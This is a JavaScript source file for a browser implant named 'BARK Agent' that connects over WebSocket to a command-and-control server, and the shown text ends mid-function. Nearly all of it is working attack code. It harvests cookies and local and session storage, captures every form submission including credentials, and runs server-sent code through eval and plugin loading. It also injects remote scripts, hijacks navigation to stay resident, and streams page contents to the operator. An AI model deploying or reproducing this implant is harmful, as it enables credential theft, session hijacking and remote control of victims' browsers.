(function() {
    console.log("BARK Agent activated");
    
    // Command registry to store all available commands
    const CommandRegistry = {
        modules: {},
        
        // Register a module with its commands
        registerModule: function(moduleName, moduleHandlers) {
            this.modules[moduleName] = moduleHandlers;
        },
        
        // Execute a command from a specific module
        executeCommand: function(moduleName, commandName, params) {
            if (!this.modules[moduleName]) {
                return { error: `Unknown module: ${moduleName}` };
            }
            
            if (!this.modules[moduleName][commandName]) {
                return { error: `Unknown command '${commandName}' in module '${moduleName}'` };
            }
            
            try {
                return this.modules[moduleName][commandName](params);
            } catch (error) {
                return { error: error.toString() };
            }
        },
        
        // Get all registered modules and their commands
        getRegisteredCommands: function() {
            const result = {};
            Object.keys(this.modules).forEach(moduleName => {
                result[moduleName] = Object.keys(this.modules[moduleName]);
            });
            return result;
        }
    };
    
    // Logger utility
    const Logger = {
        debug: function(message, data) {
            const isDebug = true; // Set to false to disable verbose logging
            if (isDebug) {
                if (data) {
                    console.log(`[BARK Agent Debug] ${message}`, data);
                } else {
                    console.log(`[BARK Agent Debug] ${message}`);
                }
            }
        },
        
        log: function(message) {
            console.log(`[BARK Agent] ${message}`);
        },
        
        error: function(message, error) {
            if (error) {
                console.error(`[BARK Agent] ${message}`, error);
            } else {
                console.error(`[BARK Agent] ${message}`);
            }
        }
    };
    
    // Utils for common functionality
    const Utils = {
        // Generate unique agent ID
        generateAgentId: function() {
            const timestamp = Date.now().toString(36);
            const randomStr = Math.random().toString(36).substring(2, 10);
            return `agent_${timestamp}_${randomStr}`;
        },
        
        // Get browser and system information
        getSystemInfo: function() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                currentUrl: window.location.href,
                hostname: window.location.hostname,
                localStorageAvailable: !!window.localStorage
            };
        },
        
        // Get cookies
        getCookies: function() {
            try {
                return document.cookie.split(';')
                    .map(cookie => cookie.trim().split('='))
                    .reduce((obj, [key, value]) => {
                        if (key) obj[key] = value;
                        return obj;
                    }, {});
            } catch (e) {
                return { error: e.toString() };
            }
        },
        
        // Get localStorage content
        getLocalStorage: function() {
            try {
                if (!window.localStorage) return { error: "LocalStorage not available" };
                
                const storage = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    storage[key] = localStorage.getItem(key);
                }
                return storage;
            } catch (e) {
                return { error: e.toString() };
            }
        },
        
        // Rewrite relative URLs to absolute URLs for remote view
        rewriteURLs: function(html, baseURL) {
            try {
                Logger.debug("Rewriting URLs with base:", baseURL);
                
                // Create a base URL object for the current page
                const base = new URL(baseURL);
                const protocol = base.protocol;
                const host = base.host;
                const origin = base.origin;
                
                // Function to convert any relative URL to absolute
                const makeAbsolute = (url) => {
                    if (!url || url.trim() === '') return url;
                    
                    // Skip if already absolute
                    if (url.match(/^https?:\/\//)) return url;
                    if (url.match(/^\/\//)) return protocol + url;
                    if (url.match(/^data:/)) return url;
                    if (url.match(/^mailto:/)) return url;
                    if (url.match(/^javascript:/)) return url;
                    if (url.match(/^tel:/)) return url;
                    if (url === '#' || url.startsWith('#')) return url;
                    
                    try {
                        // Use the URL constructor for proper relative resolution
                        return new URL(url, baseURL).href;
                    } catch (e) {
                        Logger.debug("Failed to resolve URL:", url, e);
                        return url;
                    }
                };
                
                // Replace href, src, and action attributes
                html = html.replace(/(\s)(href|src|action)=["']([^"']*?)["']/gi, function(match, space, attr, url) {
                    const absoluteURL = makeAbsolute(url);
                    if (absoluteURL !== url) {
                        Logger.debug(`Rewrote ${attr}: ${url} -> ${absoluteURL}`);
                        return space + attr + '="' + absoluteURL + '"';
                    }
                    return match;
                });
                
                // Replace CSS url() functions
                html = html.replace(/url\s*\(\s*["']?([^"')]*?)["']?\s*\)/gi, function(match, url) {
                    const absoluteURL = makeAbsolute(url);
                    if (absoluteURL !== url) {
                        Logger.debug(`Rewrote CSS url(): ${url} -> ${absoluteURL}`);
                        return 'url("' + absoluteURL + '")';
                    }
                    return match;
                });
                
                // Replace @import statements in CSS
                html = html.replace(/@import\s+["']([^"']*?)["']/gi, function(match, url) {
                    const absoluteURL = makeAbsolute(url);
                    if (absoluteURL !== url) {
                        Logger.debug(`Rewrote @import: ${url} -> ${absoluteURL}`);
                        return '@import "' + absoluteURL + '"';
                    }
                    return match;
                });
                
                // Replace <base> tag href if present (this affects all relative URLs)
                html = html.replace(/<base\s+([^>]*?)>/gi, function(match, attributes) {
                    return match.replace(/href=["']([^"']*?)["']/i, function(hrefMatch, hrefUrl) {
                        const absoluteURL = makeAbsolute(hrefUrl);
                        if (absoluteURL !== hrefUrl) {
                            Logger.debug(`Rewrote base href: ${hrefUrl} -> ${absoluteURL}`);
                            return 'href="' + absoluteURL + '"';
                        }
                        return hrefMatch;
                    });
                });
                
                // Replace background and background-image CSS properties in style attributes
                html = html.replace(/style=["']([^"']*?)["']/gi, function(match, styles) {
                    const updatedStyles = styles.replace(/background(-image)?\s*:\s*url\s*\(\s*["']?([^"')]*?)["']?\s*\)/gi, function(styleMatch, imageProp, url) {
                        const absoluteURL = makeAbsolute(url);
                        if (absoluteURL !== url) {
                            Logger.debug(`Rewrote style background: ${url} -> ${absoluteURL}`);
                            return `background${imageProp || ''}: url("${absoluteURL}")`;
                        }
                        return styleMatch;
                    });
                    
                    if (updatedStyles !== styles) {
                        return 'style="' + updatedStyles + '"';
                    }
                    return match;
                });
                
                Logger.debug("URL rewriting completed");
                return html;
            } catch (e) {
                Logger.error("Error rewriting URLs:", e);
                return html; // Return original HTML if rewriting fails
            }
        }
    };
    
    // Define command modules
    
    // Recon module commands
    const ReconModule = {
        browser_info: function(params) {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                plugins: Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    description: p.description,
                    filename: p.filename
                }))
            };
        },
        
        capture_cookies: function(params) {
            return Utils.getCookies();
        },
        
        screen_info: function(params) {
            return {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth,
                orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
                devicePixelRatio: window.devicePixelRatio
            };
        },
        
        location_info: function(params) {
            return {
                url: window.location.href,
                host: window.location.host,
                protocol: window.location.protocol,
                path: window.location.pathname,
                query: window.location.search,
                hash: window.location.hash,
                referrer: document.referrer
            };
        }
    };
    
    // DOM manipulation commands
    const DomModule = {
        get_element: function(params) {
            if (params.length < 1) return { error: "Selector required" };
            const selector = params[0];
            const element = document.querySelector(selector);
            if (!element) return { error: "Element not found" };
            
            return {
                tagName: element.tagName,
                id: element.id,
                className: element.className,
                textContent: element.textContent.substring(0, 200) // Limit text length
            };
        },
        
        get_elements: function(params) {
            if (params.length < 1) return { error: "Selector required" };
            const allSelector = params[0];
            const elements = Array.from(document.querySelectorAll(allSelector));
            
            return elements.map(el => ({
                tagName: el.tagName,
                id: el.id,
                className: el.className,
                textContent: el.textContent.substring(0, 50) // Limit text length
            })).slice(0, 20); // Limit to 20 results
        },
        
        inject_script: function(params) {
            if (params.length < 1) return { error: "Script URL required" };
            const scriptUrl = params[0];
            
            return new Promise((resolve, reject) => {
                const script = document.createElement('script');
                script.src = scriptUrl;
                script.onload = () => resolve({ success: true });
                script.onerror = () => reject({ error: "Script failed to load" });
                document.head.appendChild(script);
            });
        }
    };
    
    // Storage commands
    const StorageModule = {
        get_local_storage: function(params) {
            return Utils.getLocalStorage();
        },
        
        get_session_storage: function(params) {
            try {
                if (!window.sessionStorage) return { error: "SessionStorage not available" };
                
                const storage = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    storage[key] = sessionStorage.getItem(key);
                }
                return storage;
            } catch (e) {
                return { error: e.toString() };
            }
        },
        
        set_local_storage: function(params) {
            if (params.length < 2) return { error: "Key and value required" };
            try {
                localStorage.setItem(params[0], params[1]);
                return { success: true };
            } catch (e) {
                return { error: e.toString() };
            }
        }
    };
    
    // Network commands
    const NetworkModule = {
        fetch: function(params) {
            if (params.length < 1) return { error: "URL required" };
            const url = params[0];
            
            return new Promise((resolve, reject) => {
                fetch(url)
                    .then(response => response.text())
                    .then(data => resolve({ 
                        success: true, 
                        data: data.substring(0, 1000) // Limit response size
                    }))
                    .catch(error => reject({ error: error.toString() }));
            });
        },
        
        websocket_info: function(params) {
            return {
                connected: BARK_AGENT.socket && BARK_AGENT.socket.readyState === WebSocket.OPEN,
                readyState: BARK_AGENT.socket ? BARK_AGENT.socket.readyState : null,
                url: BARK_AGENT.config.serverUrl
            };
        }
    };
    
    // Exec module for JavaScript execution
    const ExecModule = {
        eval: function(params) {
            if (params.length < 1) return { error: "Code required" };
            try {
                // Join all params and evaluate as JavaScript
                const code = params.join('.');
                const result = eval(code);
                return result;
            } catch (e) {
                return { error: e.toString() };
            }
        }
    };
    
    // Register all modules
    CommandRegistry.registerModule("recon", ReconModule);
    CommandRegistry.registerModule("dom", DomModule);
    CommandRegistry.registerModule("storage", StorageModule);
    CommandRegistry.registerModule("net", NetworkModule);
    CommandRegistry.registerModule("exec", ExecModule);
    
    // Plugin system - allows adding new modules/commands at runtime
    const PluginSystem = {
        registerPlugin: function(pluginName, moduleDefinitions) {
            Logger.log(`Loading plugin: ${pluginName}`);
            
            // Register each module from the plugin
            Object.keys(moduleDefinitions).forEach(moduleName => {
                // Check if module exists - either extend or create new
                if (CommandRegistry.modules[moduleName]) {
                    // Extend existing module with new commands
                    Object.assign(CommandRegistry.modules[moduleName], moduleDefinitions[moduleName]);
                    Logger.debug(`Extended module: ${moduleName}`);
                } else {
                    // Register new module
                    CommandRegistry.registerModule(moduleName, moduleDefinitions[moduleName]);
                    Logger.debug(`Registered new module: ${moduleName}`);
                }
            });
            
            return true;
        }
    };
    
    // Main agent object
    const BARK_AGENT = {
        version: "1337",
        agentId: null,
        socket: null,
        config: {
            // Use WebSocket protocol matching the page's protocol (ws or wss)
            serverUrl: 'ws://localhost:8080/ws',
            heartbeatInterval: 5000, // 5 seconds
            reconnectInterval: 30000, // 30 seconds
            maxReconnectAttempts: 5
        },
        
        // Initialize the agent
        init: function() {
            Logger.log("Agent initializing...");
            this.agentId = "__BARK_AGENT_ID__";
            this.connectToC2();
            this.installHooks();
        },
        
        // Connect to C2 server
        connectToC2: function(reconnectAttempt = 0) {
            Logger.log("Establishing connection to C2...");
            
            try {
                this.socket = new WebSocket(this.config.serverUrl);
                
                // Connection opened
                this.socket.addEventListener('open', (event) => {
                    Logger.log("Connection established with C2 server");
                    
                    // Send agent activation message
                    this.sendMessage({
                        type: "agent_activation",
                        agentId: this.agentId,
                        version: this.version,
                        timestamp: new Date().toISOString(),
                        systemInfo: Utils.getSystemInfo(),
                        capabilities: CommandRegistry.getRegisteredCommands()
                    });
                    
                    // Start heartbeat after successful connection
                    this.startHeartbeat();
                });
                
                // Listen for messages
                this.socket.addEventListener('message', (event) => {
                    Logger.debug("Raw message received", event.data);
                    this.handleServerMessage(event);
                });
                
                // Handle errors
                this.socket.addEventListener('error', (event) => {
                    Logger.error("WebSocket error:", event);
                });
                
                // Handle connection close
                this.socket.addEventListener('close', (event) => {
                    Logger.log(`Connection closed: ${event.code} ${event.reason}`);
                    
                    // Cleanup heartbeat
                    if (this.heartbeatTimer) {
                        clearInterval(this.heartbeatTimer);
                        this.heartbeatTimer = null;
                    }
                    
                    // Attempt to reconnect if this wasn't a normal closure
                    if (event.code !== 1000 && reconnectAttempt < this.config.maxReconnectAttempts) {
                        const nextAttempt = reconnectAttempt + 1;
                        Logger.log(`Attempting to reconnect (${nextAttempt}/${this.config.maxReconnectAttempts}) in ${this.config.reconnectInterval/1000} seconds...`);
                        
                        setTimeout(() => {
                            this.connectToC2(nextAttempt);
                        }, this.config.reconnectInterval);
                    }
                });
            } catch (error) {
                Logger.error("Failed to connect to C2 server:", error);
            }
        },
        
        // Send message to C2 server
        sendMessage: function(message) {
            if (this.socket && this.socket.readyState === WebSocket.OPEN) {
                try {
                    this.socket.send(JSON.stringify(message));
                    return true;
                } catch (error) {
                    Logger.error("Error sending message:", error);
                    return false;
                }
            }
            return false;
        },
        
        // Update the handleServerMessage function in BARK_AGENT to store current command ID
handleServerMessage: function(event) {
    try {
        const message = JSON.parse(event.data);
        Logger.log(`Received message type: ${message.type}`);
        
        switch (message.type) {
            case "command":
                Logger.log(`Command received: ${message.command}`);
                
                // Store the current command ID for reference by plugins
                if (message.command && message.command.id) {
                    window._barkCurrentCommandId = message.command.id;
                }
                
                // Make sure the command structure exists
                if (message.command && message.command.id && message.command.action) {
                    // Check for remote view command specifically
                    if (message.command.action.startsWith("remote_view.")) {
                        const parts = message.command.action.split('.');
                        const remoteViewCmd = parts[1]; // "start", "stop", or "capture"
                        const params = parts.length > 2 ? parts.slice(2) : [];
                        
                        if (CommandRegistry.modules.remote_view && 
                            CommandRegistry.modules.remote_view[remoteViewCmd]) {
                            
                            // Execute the command directly
                            const result = CommandRegistry.modules.remote_view[remoteViewCmd](params);
                            
                            // Send the initial command acknowledgment
                            this.sendMessage({
                                type: "command_result",
                                agentId: this.agentId,
                                commandId: message.command.id,
                                timestamp: new Date().toISOString(),
                                result: result,
                                success: !result.error
                            });
                            return;
                        }
                    }
                    
                    this.executeCommand(message.command);
                } else {
                    Logger.error("Invalid command structure:", message.command);
                }
                break;
                
            // Handle other message types...
            case "config_update":
                this.updateConfig(message.config);
                break;
            case "pong":
                Logger.log("Received pong from server");
                break;
            case "plugin_install":
                if (message.plugin && message.plugin.name && message.plugin.code) {
                    this.installPlugin(message.plugin);
                }
                break;
            default:
                Logger.log(`Unhandled message type: ${message.type}`);
        }
    } catch (error) {
        Logger.error("Error processing message:", error);
        Logger.debug("Raw data:", event.data);
    }
},

        // Install a plugin
        installPlugin: function(plugin) {
            try {
                Logger.log(`Attempting to install plugin: ${plugin.name}`);
                
                // Create a safe function to execute the plugin code
                const pluginFunction = new Function('registerPlugin', plugin.code);
                
                // Execute the plugin code with the plugin registration function
                pluginFunction((pluginName, moduleDefinitions) => {
                    return PluginSystem.registerPlugin(pluginName, moduleDefinitions);
                });
                
                Logger.log(`Plugin ${plugin.name} installed successfully`);
                
                // Notify server about successful plugin installation
                this.sendMessage({
                    type: "plugin_installed",
                    agentId: this.agentId,
                    pluginName: plugin.name,
                    timestamp: new Date().toISOString(),
                    success: true
                });
                
                return true;
            } catch (error) {
                Logger.error(`Failed to install plugin ${plugin.name}:`, error);
                
                // Notify server about failed plugin installation
                this.sendMessage({
                    type: "plugin_installed",
                    agentId: this.agentId,
                    pluginName: plugin.name,
                    timestamp: new Date().toISOString(),
                    success: false,
                    error: error.toString()
                });
                
                return false;
            }
        },
        
        // Execute commands from the server
        executeCommand: function(command) {
            if (!command || !command.action) {
                Logger.error("Invalid command received");
                return;
            }
            
            Logger.log(`Executing command: ${command.action}`);
            
            try {
                let result = null;
                let success = false;
                
                // Handle basic ping command
                if (command.action === "ping") {
                    result = "Pong";
                    success = true;
                } 
                // Handle get_capabilities command
                else if (command.action === "get_capabilities") {
                    result = CommandRegistry.getRegisteredCommands();
                    success = true;
                }
                // Handle module-based commands
                else {
                    // Parse command structure using module.command.params format
                    const parts = command.action.split('.');
                    const moduleName = parts[0];
                    const commandName = parts[1];
                    const params = parts.length > 2 ? parts.slice(2) : [];
                    
                    // Execute the command through the registry
                    result = CommandRegistry.executeCommand(moduleName, commandName, params);
                    success = !result.error;
                }
                
                // Send result back to C2
                this.sendMessage({
                    type: "command_result",
                    agentId: this.agentId,
                    commandId: command.id,
                    timestamp: new Date().toISOString(),
                    result: result,
                    success: success
                });
                
            } catch (error) {
                Logger.error("Command execution error:", error);
                
                // Send error back to C2
                this.sendMessage({
                    type: "command_result",
                    agentId: this.agentId,
                    commandId: command.id,
                    timestamp: new Date().toISOString(),
                    result: { error: error.toString() },
                    success: false
                });
            }
        },
        
        // Update agent configuration
        updateConfig: function(newConfig) {
            if (!newConfig) return;
            
            // Update config properties
            Object.keys(newConfig).forEach(key => {
                if (this.config.hasOwnProperty(key)) {
                    this.config[key] = newConfig[key];
                }
            });
            
            Logger.log("Configuration updated");
            
            // Restart heartbeat with new interval if it changed
            if (newConfig.heartbeatInterval && this.heartbeatTimer) {
                this.startHeartbeat();
            }
        },
        
        // Start heartbeat mechanism
        heartbeatTimer: null,
        startHeartbeat: function() {
            // Clear existing heartbeat if any
            if (this.heartbeatTimer) {
                clearInterval(this.heartbeatTimer);
            }
            
            // Start new heartbeat interval
            this.heartbeatTimer = setInterval(() => {
                this.sendMessage({
                    type: "heartbeat",
                    agentId: this.agentId,
                    timestamp: new Date().toISOString()
                });
            }, this.config.heartbeatInterval);
        },
        
        // Install hooks for form submissions, etc.
        installHooks: function() {
            try {
                // Monitor form submissions
                console.log("Installing form submission hooks");
                document.addEventListener('submit', (e) => {
                    const formData = {};
                    const elements = e.target.elements;
                    
                    for (let i = 0; i < elements.length; i++) {
                        const element = elements[i];
                        if (element.name && element.value) {
                            formData[element.name] = element.value;
                        }
                    }
                    
                    this.sendMessage({
                        type: "form_submission",
                        agentId: this.agentId,
                        timestamp: new Date().toISOString(),
                        url: window.location.href,
                        formData: formData
                    });
                });
                
                Logger.log("Hooks installed");
            } catch (error) {
                Logger.error("Error installing hooks:", error);
            }
        }
    };
    
    // Example of how to add a plugin at runtime:
    /*
    PluginSystem.registerPlugin("screenshotPlugin", {
        "screenshot": {
            "capture": function(params) {
                // Code to capture screenshot
                return { message: "Screenshot captured" };
            }
        }
    });
    */

    // Add this to the BARK_AGENT object definition

// Navigation interception functionality
BARK_AGENT.enableNavigationPersistence = function() {
    Logger.log("Setting up navigation interception...");
    
    // Flag to track if navigation hooks are installed
    if (this.navigationHooksInstalled) {
        Logger.log("Navigation hooks already installed");
        return;
    }
    
    // Store original functions we're going to override
    this.originalFunctions = {
        pushState: window.history.pushState,
        replaceState: window.history.replaceState,
        assign: window.location.assign,
        replace: window.location.replace,
        open: window.open
    };
    
    // 1. Override History API methods
    window.history.pushState = (state, title, url) => {
        Logger.log(`Intercepted history.pushState to: ${url}`);
        this.handleNavigation(url, 'history');
    };
    
    window.history.replaceState = (state, title, url) => {
        Logger.log(`Intercepted history.replaceState to: ${url}`);
        this.handleNavigation(url, 'history');
    };
    
    // 2. Override location methods
    const originalLocationDescriptor = Object.getOwnPropertyDescriptor(window, 'location');
    if (originalLocationDescriptor && originalLocationDescriptor.configurable) {
        Object.defineProperty(window, 'location', {
            get: function() {
                return originalLocationDescriptor.get.call(this);
            },
            set: (url) => {
                Logger.log(`Intercepted location change to: ${url}`);
                this.handleNavigation(url, 'location');
                return url;
            },
            configurable: true
        });
    }
    
    window.location.assign = (url) => {
        Logger.log(`Intercepted location.assign to: ${url}`);
        this.handleNavigation(url, 'assign');
    };
    
    window.location.replace = (url) => {
        Logger.log(`Intercepted location.replace to: ${url}`);
        this.handleNavigation(url, 'replace');
    };
    
    // 3. Override window.open
    window.open = (url) => {
        Logger.log(`Intercepted window.open to: ${url}`);
        this.handleNavigation(url, 'open');
        return window; // Return current window reference
    };
    
    // 4. Add click handler for anchor tags
    document.addEventListener('click', this.anchorClickHandler = (e) => {
        const anchor = e.target.closest('a');
        if (anchor && anchor.href && !anchor.href.startsWith('javascript:')) {
            // Skip handling for same-page anchors (#links)
            if (anchor.getAttribute('href').startsWith('#')) {
                return;
            }
            
            Logger.log(`Intercepted anchor click to: ${anchor.href}`);
            e.preventDefault();
            e.stopPropagation();
            
            this.handleNavigation(anchor.href, 'anchor');
            return false;
        }
    }, true);
    
    // 5. Add form submission handler
    document.addEventListener('submit', this.formSubmitHandler = (e) => {
        Logger.log("Intercepted form submission");
        e.preventDefault();
        
        const form = e.target;
        const method = (form.method || 'get').toLowerCase();
        const action = form.action || window.location.href;
        const formData = new FormData(form);
        
        if (method === 'get') {
            const params = new URLSearchParams(formData).toString();
            const url = action + (action.includes('?') ? '&' : '?') + params;
            this.handleNavigation(url, 'form-get');
        } else {
            // For POST, we'll do a real fetch but intercept the result
            Logger.log(`Performing POST request to: ${action}`);
            
            fetch(action, {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(html => {
                this.replaceContent(html, action);
            })
            .catch(error => {
                Logger.error("Failed to fetch POST response:", error);
                // Fall back to normal form submission as a last resort
                form.submit();
            });
        }
    }, true);
    
    // 6. Handle browser back/forward buttons
    window.addEventListener('popstate', this.popStateHandler = (e) => {
        Logger.log("Intercepted popstate event");
        const currentUrl = window.location.href;
        this.handleNavigation(currentUrl, 'popstate');
    });
    
    // Mark as installed
    this.navigationHooksInstalled = true;
    Logger.log("Navigation interception successfully installed");
};

// Function to handle all types of navigation
BARK_AGENT.handleNavigation = function(url, source) {
    // Normalize the URL if it's relative
    let fullUrl = url;
    if (url && typeof url === 'string' && !url.includes('://')) {
        const a = document.createElement('a');
        a.href = url;
        fullUrl = a.href;
    }
    
    Logger.log(`Handling navigation to ${fullUrl} from ${source}`);
    
    // Notify about the navigation event
    this.sendMessage({
        type: "navigation_event",
        agentId: this.agentId,
        timestamp: new Date().toISOString(),
        fromUrl: window.location.href,
        toUrl: fullUrl,
        source: source
    });
    
    // Fetch the target page content
    fetch(fullUrl)
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error ${response.status}`);
            }
            return response.text();
        })
        .then(html => {
            this.replaceContent(html, fullUrl);
        })
        .catch(error => {
            Logger.error(`Navigation failed to ${fullUrl}:`, error);
            
            // As a fallback for critical errors, perform actual navigation
            Logger.log("Using fallback navigation...");
            if (confirm(`Navigation interception failed. Continue to ${fullUrl}? (Agent will be lost)`)) {
                // Restore original functions temporarily
                window.history.pushState = this.originalFunctions.pushState;
                window.location.href = fullUrl;
            }
        });
};

// Function to replace current page content with new content
BARK_AGENT.replaceContent = function(html, url) {
    try {
        Logger.log(`Replacing content from ${url}`);
        
        // Parse the HTML
        const parser = new DOMParser();
        const newDoc = parser.parseFromString(html, 'text/html');
        
        // Update title
        if (newDoc.title) {
            document.title = newDoc.title;
        }
        
        // Update URL in address bar without triggering navigation
        const origPushState = this.originalFunctions.pushState;
        origPushState.call(window.history, {}, newDoc.title || '', url);
        
        // Save our script element for reinsertion
        const agentScript = document.getElementById('bark-agent-script');
        const agentCode = agentScript ? agentScript.textContent : null;
        
        // Replace content in the current document but preserve our script
        document.head.innerHTML = newDoc.head.innerHTML;
        document.body.innerHTML = newDoc.body.innerHTML;
        
        // Re-insert our agent script if it was found
        if (agentCode) {
            const newScript = document.createElement('script');
            newScript.id = 'bark-agent-script';
            newScript.textContent = agentCode;
            document.head.appendChild(newScript);
        }
        
        // Reattach our event listeners since we've replaced the DOM
        this.reinstallEventListeners();
        
        Logger.log(`Content successfully replaced, simulating navigation to: ${url}`);
        
        // Run scripts in the new content to ensure proper page functionality
        this.executeNewPageScripts(newDoc);
        
    } catch (error) {
        Logger.error("Error replacing content:", error);
    }
};

// Re-attach event handlers after DOM replacement
BARK_AGENT.reinstallEventListeners = function() {
    if (this.anchorClickHandler) {
        document.addEventListener('click', this.anchorClickHandler, true);
    }
    
    if (this.formSubmitHandler) {
        document.addEventListener('submit', this.formSubmitHandler, true);
    }
    
    if (this.popStateHandler) {
        window.addEventListener('popstate', this.popStateHandler);
    }
};

// Execute scripts from the new page content
BARK_AGENT.executeNewPageScripts = function(newDoc) {
    try {
        // Get all scripts from the new document
        const scripts = newDoc.querySelectorAll('script');
        
        // Execute each script in order
        scripts.forEach(script => {
            // Skip our agent script
            if (script.id === 'bark-agent-script') {
                return;
            }
            
            try {
                const newScript = document.createElement('script');
                
                // Copy attributes
                Array.from(script.attributes).forEach(attr => {
                    newScript.setAttribute(attr.name, attr.value);
                });
                
                // Handle both inline and external scripts
                if (script.src) {
                    newScript.src = script.src;
                } else {
                    newScript.textContent = script.textContent;
                }
                
                // Add to document
                document.head.appendChild(newScript);
            } catch (scriptError) {
                Logger.error("Error executing script:", scriptError);
            }
        });
    } catch (error) {
        Logger.error("Error executing page scripts:", error);
    }
};

// Disable navigation interception
BARK_AGENT.disableNavigationPersistence = function() {
    if (!this.navigationHooksInstalled) {
        return;
    }
    
    // Restore original functions
    if (this.originalFunctions) {
        window.history.pushState = this.originalFunctions.pushState;
        window.history.replaceState = this.originalFunctions.replaceState;
        window.location.assign = this.originalFunctions.assign;
        window.location.replace = this.originalFunctions.replace;
        window.open = this.originalFunctions.open;
    }
    
    // Remove event listeners
    if (this.anchorClickHandler) {
        document.removeEventListener('click', this.anchorClickHandler, true);
    }
    
    if (this.formSubmitHandler) {
        document.removeEventListener('submit', this.formSubmitHandler, true);
    }
    
    if (this.popStateHandler) {
        window.removeEventListener('popstate', this.popStateHandler);
    }
    
    this.navigationHooksInstalled = false;
    Logger.log("Navigation interception disabled");
};

// Update installHooks to enable navigation persistence
BARK_AGENT.installHooks = function() {
    try {
        // Monitor form submissions
        document.addEventListener('submit', (e) => {
            const formData = {};
            const elements = e.target.elements;
            
            for (let i = 0; i < elements.length; i++) {
                const element = elements[i];
                if (element.name && element.value) {
                    formData[element.name] = element.value;
                }
            }
            
            this.sendMessage({
                type: "form_submission",
                agentId: this.agentId,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                formData: formData
            });
        });
        
        // Enable navigation persistence by default
        this.enableNavigationPersistence();
        
        Logger.log("Hooks installed");
    } catch (error) {
        Logger.error("Error installing hooks:", error);
    }
};

// Register the navigation plugin
PluginSystem.registerPlugin("navigationPlugin", {
    "navigation": {
        "enable_persistence": function(params) {
            try {
                BARK_AGENT.enableNavigationPersistence();
                return {
                    success: true,
                    message: "Navigation persistence enabled"
                };
            } catch (e) {
                return { 
                    error: e.toString(),
                    message: "Failed to enable navigation persistence" 
                };
            }
        },
        
        "disable_persistence": function(params) {
            try {
                BARK_AGENT.disableNavigationPersistence();
                return {
                    success: true,
                    message: "Navigation persistence disabled"
                };
            } catch (e) {
                return { 
                    error: e.toString(),
                    message: "Failed to disable navigation persistence" 
                };
            }
        },
        
        "get_status": function(params) {
            return {
                persistenceEnabled: BARK_AGENT.navigationHooksInstalled || false,
                hooks: {
                    historyAPI: !!BARK_AGENT.originalFunctions?.pushState,
                    anchorClick: !!BARK_AGENT.anchorClickHandler,
                    formSubmit: !!BARK_AGENT.formSubmitHandler,
                    popState: !!BARK_AGENT.popStateHandler
                }
            };
        }
    }
});

function loadPako() {
    return new Promise((resolve, reject) => {
        if (window.pako) {
            resolve(window.pako);
            return;
        }
        
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js';
        script.onload = () => resolve(window.pako);
        script.onerror = () => reject(new Error('Failed to load pako library'));
        document.head.appendChild(script);
    });
}

// Fixed Remote View Plugin for proper command tracking with remote_view_result type
PluginSystem.registerPlugin("remoteViewPlugin", {
    "remote_view": {
        // Helper function to capture DOM while avoiding agent script
        _captureDOM: function() {
            try {
                // Create a safe clone of the document to work with
                const docClone = document.cloneNode(true);
                
                // Remove all script tags to reduce size and prevent sending our agent code
                const scripts = docClone.querySelectorAll('script');
                scripts.forEach(script => {
                    if (script.parentNode) {
                        script.parentNode.removeChild(script);
                    }
                });
                
                const styleLinks = docClone.querySelectorAll('link[rel="stylesheet"]');
                styleLinks.forEach(link => {
                    const href = link.getAttribute('href');
                    if (href) {
                        // very crude check to see if its not already a url
                        if (!href.includes('http')) {

                            try {
                                const absoluteUrl = new URL(href, window.location.href).href;
                                link.setAttribute('href', absoluteUrl);
                                Logger.debug(`Converted relative URL to absolute URL: ${absoluteUrl}`);
                            } catch (e) {
                                Logger.error(`Failed to convert URL: ${href}`, e);
                            }
                        }
                    }
                });

                const images = docClone.querySelectorAll('img');
                images.forEach(img => {
                    const src = img.getAttribute('src');
                    if (src && !src.match(/^(https?:)?\/\//) && !src.startsWith('data:')) {
                        // Convert relative URL to absolute URL
                        const absoluteUrl = new URL(src, window.location.href).href;
                        img.setAttribute('src', absoluteUrl);
                    }
                });
                
                // Get viewport information
                const viewport = {
                    width: window.innerWidth,
                    height: window.innerHeight,
                    scrollX: window.scrollX,
                    scrollY: window.scrollY
                };
                
                // Get computed styles for important elements (limited set)
                const computedStyles = {};
                try {
                    ['body', '.container', 'header', 'footer', 'main'].forEach(selector => {
                        const elements = document.querySelectorAll(selector);
                        if (elements.length > 0) {
                            computedStyles[selector] = {};
                            const style = window.getComputedStyle(elements[0]);
                            ['background-color', 'color', 'width', 'height'].forEach(prop => {
                                computedStyles[selector][prop] = style.getPropertyValue(prop);
                            });
                        }
                    });
                } catch (e) {
                    Logger.error("Error capturing styles:", e);
                }
                
                // Get HTML content, but limit its size
                let html = "";
                try {

                    const styleElements = docClone.querySelectorAll('style');
                    styleElements.forEach(styleEl => {
                        if (styleEl.textContent) {
                            // Replace relative URLs in @import statements with absolute URLs
                            styleEl.textContent = styleEl.textContent.replace(
                                /@import\s+url\(['"]?([^'")]+)['"]?\)/g,
                                (match, url) => {
                                    if (!url.match(/^(https?:)?\/\//)) {
                                        const absoluteUrl = new URL(url, window.location.href).href;
                                        return `@import url('${absoluteUrl}')`;
                                    }
                                    return match;
                                }
                            );
                            
                            // Fix relative URLs in url() references
                            styleEl.textContent = styleEl.textContent.replace(
                                /url\(['"]?([^'")]+)['"]?\)/g,
                                (match, url) => {
                                    if (!url.match(/^(https?:)?\/\//) && !url.startsWith('data:')) {
                                        const absoluteUrl = new URL(url, window.location.href).href;
                                        return `url('${absoluteUrl}')`;
                                    }
                                    return match;
                                }
                            );
                        }
                    });


                    html = docClone.documentElement.outerHTML;
                    // compress html using gzip and then base64 encode it 
                    try{
